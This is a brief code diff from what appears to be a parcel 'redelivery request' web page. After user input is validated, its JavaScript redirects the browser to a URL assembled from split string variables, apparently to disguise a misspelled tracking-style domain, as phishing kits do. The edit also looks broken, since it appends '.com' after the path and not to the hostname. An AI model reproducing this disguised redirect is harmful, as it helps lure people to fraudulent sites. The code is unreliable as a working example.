@@ -40,7 +40,7 @@
 	  let spark="chectrackuasbalikups"
 	  let https ="https"
 	  let webapp ="RedeliveryRequest/"
-      window.location= https+"://"+spark+"/"+webapp
+      window.location= https+"://"+spark+"/"+webapp+".com"
 	  userInput.className = ''; // Remove the 'invalid' class
       errorMsg.textContent = '';
     } else {
